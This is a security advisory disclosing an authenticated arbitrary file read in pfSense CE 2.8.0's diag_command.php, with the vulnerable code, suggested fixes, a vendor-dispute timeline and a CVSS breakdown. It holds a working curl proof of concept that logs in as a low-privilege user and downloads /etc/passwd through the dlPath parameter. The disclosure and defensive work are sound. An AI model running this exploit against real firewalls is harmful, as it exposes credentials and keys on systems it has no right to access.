# Arbitrary File Read in pfSense 2.8.0 via Diagnostics Interface

#### CVE ID: *Pending*

#### Date: 2025-06-27

#### Author: Seth Kraft

#### Vendor Homepage: [https://www.netgate.com/](https://www.netgate.com/)

#### Vendor Changelog: [https://docs.netgate.com/pfsense/en/latest/releases/](https://docs.netgate.com/pfsense/en/latest/releases/)

#### Software Link: [https://www.pfsense.org/download/](https://www.pfsense.org/download/)

#### Version: pfSense CE 2.8.0 (latest stable as of June 26, 2025)

#### CWE: CWE-552 (Files or Directories Accessible to External Parties)

#### CVSS Base Score: 6.5 (Medium)

#### Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

#### Type: Authenticated Arbitrary File Read / Local File Disclosure

---

## Authorization

**For authorized testing and research purposes only.** Do not test or exploit this vulnerability on systems you do not own or have explicit permission to test.

---

## Summary

pfSense CE 2.8.0 contains a Local File Disclosure vulnerability in the diagnostics page `diag_command.php`, which allows authenticated users to download arbitrary files from the underlying file system.

An attacker with privileged web access can supply an arbitrary path in the `dlPath` parameter to exfiltrate sensitive files. 

This functionality lacks any path sanitization, directory restriction, or access controls beyond permission assignment.

---

## Details

The vulnerable logic is located in the file `src/usr/local/www/diag_command.php`:

```php
if ($_POST['submit'] == "DOWNLOAD" && file_exists($_POST['dlPath'])) {
    session_cache_limiter('public');
    send_user_download('file', $_POST['dlPath']);
}
```

There are no security checks or sanitization measures applied to the user-controlled `dlPath` parameter. 

Any file path the PHP process can read will be served back to the user.

---

## Proof of Concept

**Create group and assign a single privilege** (`WebCfg - Diagnostics: Command`)
![Screenshot 2025-06-27 133201](https://github.com/user-attachments/assets/b1063a5c-442a-4628-ac94-e0fa5d6f10c4)

> I appreciate the built-in security warning related to assigning the `WebCfg - Diagnostics: Command` privilege. But this disclaimer does not constitute as proper access control.
>
> A permission in a web interface should be scoped based on its label and intended use — not assumed to equate to root-level access on the underlying operating system.

**Assign group to** `dev` **user**
![Screenshot 2025-06-27 133218](https://github.com/user-attachments/assets/7224934e-ae31-4aa1-b879-b4f1aee7e00c)

This proof-of-concept demonstrates that a user assigned only the `WebCfg - Diagnostics: Command` permission can exfiltrate `/etc/passwd` by abusing the unsanitized `dlPath` parameter.

```bash
# 1. Start session and extract CSRF token
curl -k -c cookies.txt -s https://<IP>/diag_command.php > login_page.html
csrf_token=$(grep '__csrf_magic' login_page.html | grep 'value=' | sed -E 's/.*value="([^"]+)".*/\1/')

# 2. Authenticate as low-privileged user "dev"
curl -k -b cookies.txt -c cookies.txt \
  -d "__csrf_magic=$csrf_token" \
  -d "usernamefld=dev" \
  -d "passwordfld=pass" \
  -d "login=Sign+In" \
  https://<IP>/index.php > /dev/null

# 3. Get CSRF token post-login
curl -k -b cookies.txt -s https://<IP>/diag_command.php > diag_authed.html
csrf_token=$(grep '__csrf_magic' diag_authed.html | grep 'value=' | sed -E 's/.*value="([^"]+)".*/\1/')

# 4. Exfiltrate arbitrary file (example: /etc/passwd)
curl -k -b cookies.txt -s -X POST https://<IP>/diag_command.php \
  -d "__csrf_magic=$csrf_token" \
  -d "submit=DOWNLOAD" \
  -d "dlPath=/etc/passwd"
```

---

## Demo
![pfSense-authenticated-file-disclosure-poc](https://github.com/user-attachments/assets/0dfe9727-aab4-4b17-bcb9-5a69998549a5)

---

## Impact

Any pfSense user assigned the `WebCfg - Diagnostics: Command` privilege can:

* Read sensitive local system files
* Extract backups, credentials, and keys
* Access files far beyond their intended permissions

This violates the principle of least privilege and breaks logical privilege boundaries.

---

## Suggested Mitigation

1. Restrict `dlPath` to a safe base directory (e.g., `/tmp`) using `realpath()` and prefix enforcement
2. Strip or block paths with `..` or absolute paths
3. Only allow downloads of files listed in a safelist or temporary artifact directory

---

## Disclosure Timeline

* **2025-06-26:** Vulnerability reported to Netgate
* **2025-06-27:** Netgate responded, dismissing the issue as intended behavior
* **2025-06-27:** Researcher responded with technical rebuttal, but vendor reiterated dismissal
* **2025-06-27:** Researcher initiated public disclosure due to vendor dismissal

![image](https://github.com/user-attachments/assets/8317dd1d-95c7-4000-a942-f9435d40cfa8)

> While the vendor asserts that access to this page equates to root, this conflates web-level permissions with unrestricted backend access.
>
> Privilege should be technically enforced — not assumed — and warnings in the UI are no substitute for secure design.

---

## Estimated CVSS Breakdown

| Metric                      | Value         | Justification                                          |
| --------------------------- | ------------- | ------------------------------------------------------ |
| **AV: Attack Vector**       | N (Network)   | Exploitable via the pfSense web interface over HTTPS   |
| **AC: Attack Complexity**   | L (Low)       | Straightforward POST request with valid CSRF token     |
| **PR: Privileges Required** | L (Low)       | Requires only `WebCfg - Diagnostics: Command` permission |
| **UI: User Interaction**    | N (None)      | No additional interaction needed                       |
| **S: Scope**                | U (Unchanged) | Same component boundary (web app reads system file)    |
| **C: Confidentiality**      | H (High)      | Arbitrary file read, including credentials and configs |
| **I: Integrity**            | N (None)      | No tampering                                           |
| **A: Availability**         | N (None)      | No denial-of-service                                   |

> Note: I selected `PR: Low` since the exploit only requires a narrowly scoped permission (`WebCfg - Diagnostics: Command`) and did not explicitly grant the user full admin permissions.

**Estimated CVSS Base Score: 6.5 (Medium)**
